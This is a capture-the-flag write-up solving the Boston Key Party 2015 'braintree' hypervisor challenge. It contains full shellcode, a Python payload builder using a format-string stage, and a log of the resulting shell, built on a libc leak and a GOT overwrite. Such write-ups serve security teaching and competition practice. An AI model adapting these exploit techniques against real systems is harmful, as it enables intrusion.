---
title: 'braintree (tz)'
author:
  - Brian Pak (Cai)
layout: post
excerpt_separator: <!--more-->
categories:
  - Pwn
ctf: Boston Key Party CTF
year: 2015
---
This is a write-up for **braintree** challenge, which is the last part of 3-chained pwnable challenge from [Boston Key Party CTF](https://ctftime.org/event/163) last weekend.  _You can also read this content from the [origial post](https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/)_.
<!--more-->

The binaries were packaged into a [tar ball](https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz).

> The MBTA wrote a cool system. It's pretty bad though, sometimes the commands work, sometimes they don't...
> Exploit it. (tz flag) 54.165.91.92 8899

The goal is to get "tz" flag by exploiting the kernel space process.

_If you haven't read the previous write-up for quincy-adams, I strongly recommend you to read before continuing with this one as we will assume knowledge gained from it._

As it was mentioned previously, we will be using the same primitive: **hypercall #92**.

Therefore, we have an arbitrary-write-anywhere primitive. So, the question is "what can we overwrite in **tz** that will get us an arbitrary code execution?"

We started looking at each of the hypercall handlers in **tz**.

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" lightbox="braintree" %}

Then, we stumbled upon hypercall #85.

This function seemed like some sort of cleanup (we called it **delete_op** in our shellcode) function for an object used in **tz**. (As I said previously, we didn't do much of reversing on **tz** as we did for **uspace** and **kspace**)

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png" lightbox="braintree" %}

It seems like the first argument (v3) is a word that represents id of some sort, but the important thing is that we can control its value. v2 is an offset to the tz data structure, and the value at **tz_space + v2 (where v2 is 0)** is 0.

Since NX is enabled on **tz**, we decided to overwrite the GOT entry to execute **system**. Since the addresses are randomized, we first need to leak an address to calculate the address of system. We are going to abuse the hypercall #92 to do 3 things:

  * Leak out libc address, so we can calculate the address of system.
  * Overwrite **free** (.got.plt in tz) with &system.
  * Overwrite contents in **v4 + 8** (aka, tz_space + 8) with a pointer to our command buffer.

However, doing all of these comes with a price. The size limit (256 bytes) starts to become an issue here. We can either put another stager in the middle to allow us more space, or optimize our payload such that it fits under 256 bytes! We chose to do latter :p

<p class="filename">shell.asm</p>
{% highlight asm linenos %}
[BITS 64]

section .text
global _start
_start:

; yay we are in kernel!!!
; optimizing for size...
mov ebp, 0x8

; leak out &getpwnam
mov eax, 0x402380       ; do_encrypt
mov edi, 0x602290       ; src (getpwnam .got.plt in tz)
mov rsi, [rel dst]      ; dst (kernel_space + 128)
mov edx, ebp            ; size
call rax

call sleep

; update the address (to be &system) and
; xor the address back with the key
mov rcx, [rel dst]
mov rax, [rcx]
xor rax, [rel xor_key]
sub rax, 0x79340        ; &getpwnam - &system (this may be different depending on libc)
xor rax, [rel xor_key]
mov [rcx], rax

; overwrite free GOT
mov eax, 0x402380       ; do_encrypt
mov rdi, [rel dst]      ; src (kernel_space + 128)
mov esi, 0x602230       ; dst (free .got.plt in tz)
mov edx, ebp            ; size
call rax

call sleep

mov rax, [rel command]  ; encrypt our command pointer
xor rax, [rel xor_key]
push rax

; overwrite [fake_obj + 8] with cmd pointer
mov eax, 0x402380       ; do_encrypt
mov rdi, rsp
mov rsi, [rel fake]
mov edx, ebp            ; size
call rax

call sleep

; setting command to 'sh'
mov rcx, [rel command]
mov dword [rcx], 0x6873

; hypercall to trigger free
; sem_lock
mov ebp, [0x60338C]     ; semaphore
mov edi, ebp
xor esi, esi
mov eax, 0x4015D0
call rax

xor rcx, rcx
mov rax, [0x603360]     ; kernel_space
mov dword [rax], 85     ; delete_op hypercall
mov [rax + 8], rcx      ; 0
lea rdx, [rax + 48]     ; rax + 48 points to args
mov [rax + 16], rdx

mov word [rax + 48], 0  ; id

; sem_unlock
mov edi, ebp
xor esi, esi
mov eax, 0x401600
call rax

call sleep

sleep:
; sleep(1)
mov eax, 0x400D00
xor edi, edi
inc edi
jmp rax

dst:
dq 0x900000080         ; scratch pad in kernel_space
fake:
dq 0x100000008         ; tz_space + 8
xor_key:
dq 0x7473656c72616863
command:
dq 0x900001000         ; we will put our command here
{% endhighlight %}
<br />

At first, we were over ~10 bytes, but once we have "optimized" a little bit, we finally got our payload to be 254 bytes!

Note that we are not using the same shell.asm as before (our new payload is now called shell.asm). However, we can continue to use the same stage1.asm and the python script from **kspace** exploit. For convenience sake, it is also attached here.

<p class="filename">pwn_tz.py</p>
{% highlight python linenos %}
#!/usr/bin/python
import struct

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

f = open('payload', 'wb')

f.write('create lol\n'.ljust(0x400, '#'))
f.write(open('shell.bin').read().ljust(0x100, '\0'))

pop_pop_ret = 0x40110F
stage1 = open('stage1.bin').read()

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))
{% endhighlight %}
<br />

<p class="filename">Pwn!</p>
{% highlight bash %}
$ nasm shell.asm -f bin -o shell.bin
$ ls -l shell.bin
-rw-rw-r-- 1 user user 254 Mar 4 21:58 shell.bin
$ nasm stage1.asm -f bin -o stage1.bin
$ python pwn_tz.py
$ (cat ../tz/payload; cat -) | sudo ./tz
bksh> bksh> bksh>
whoami
tz
{% endhighlight %}
<br />

We have abused the hypercall #92 (encrypt) to exploit both kspace and tz, but there may be another way to exploit kspace without going through the hypervisor.

Well, that's it for the 3-parts pwnable challenge write-up =)

Thank you for reading, and happy hacking!

Write-up by Cai (Brian Pak) [[https://www.bpak.org](http://www.bpak.org)]